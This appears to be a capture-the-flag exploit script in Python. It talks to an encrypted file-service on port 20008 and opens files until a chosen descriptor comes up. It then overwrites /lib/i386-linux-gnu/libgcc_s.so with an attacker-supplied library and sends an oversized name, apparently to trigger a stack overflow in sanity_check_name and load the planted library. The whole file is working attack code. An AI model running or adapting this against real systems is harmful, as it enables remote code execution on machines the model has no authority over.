"""
write to eventfd to try freeing the lock? exploiting race condition in thread pool?
stacko in sanity_check_name
"""

import struct, re
from socket import *

import pysodium


def putmsg(s, msg, pub, pri):
    nonce = b'A' * pysodium.crypto_box_NONCEBYTES
    msg = pysodium.crypto_box(msg, nonce, pub, pri)
    msg = nonce + b'\0' * 16 + msg
    msg = struct.pack('<I', len(msg)) + msg
    s.sendall(msg)


def getmsg(s, pub, pri):
    size = int.from_bytes(s.recv(4), 'little')
    if size > 0x1000:
        return s.recv(2048)
    cipher = s.recv(size)
    nonce = cipher[:24]
    cipher = cipher[24 + 16:]
    return pysodium.crypto_box_open(cipher, nonce, pub, pri)


def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('ip')
    parser.add_argument('lib')
    args = parser.parse_args()
    ip = args.ip
    lib = open(args.lib, 'rb').read()

    print('len lib', len(lib))

    ######################
    pub, pri = pysodium.crypto_box_keypair()
    pub2, pri2 = pysodium.crypto_box_keypair()

    nonce = pysodium.randombytes(pysodium.crypto_box_NONCEBYTES)
    c = pysodium.crypto_box('hello world'.encode(), nonce, pub2, pri)
    m = pysodium.crypto_box_open(c, nonce, pub, pri2)
    print(m.decode())

    ######################

    pub, pri = pysodium.crypto_box_keypair()

    s = create_connection((ip, 20008))
    spub = s.recv(pysodium.crypto_box_PUBLICKEYBYTES)
    s.sendall(pub)

    while True:
        msg = b'BBBBo777/blah\0'
        putmsg(s, msg, spub, pri)
        res = getmsg(s, spub, pri)
        print(res)

        fd = re.findall(b'fd is (\\d+)', res)
        if len(fd) == 0:
            return

        fd = fd[0]
        if fd == b'58':
            break

    msg = b'BBBBo777/lib/i386-linux-gnu/libgcc_s.so\0'
    putmsg(s, msg, spub, pri)
    res = getmsg(s, spub, pri)
    print(res)

    fd = re.findall(b'fd is (\\d+)', res)
    if len(fd) == 0:
        return

    fd = fd[0]

    BLOCK_SIZE = 0xffff
    for i in range(0, len(lib), BLOCK_SIZE):
        block = lib[i:i + BLOCK_SIZE]
        print('block', i, len(block))
        putmsg(s, b'BBBBw' + fd + b',' + str(i).encode() + block, spub, pri)
        res = getmsg(s, spub, pri)
        print(res)

    msg = b'BBBBc' + fd + b'\0'
    putmsg(s, msg, spub, pri)
    res = getmsg(s, spub, pri)
    print(res)

    msg = b'BBBBm777' + b'A' * 1024 + b'\0'
    putmsg(s, msg, spub, pri)
    print(s.recv(2048))
    print(s.recv(2048))
    # res = getmsg(s, spub, pri)
    # print(res)

    s.close()


if __name__ == '__main__':
    main()

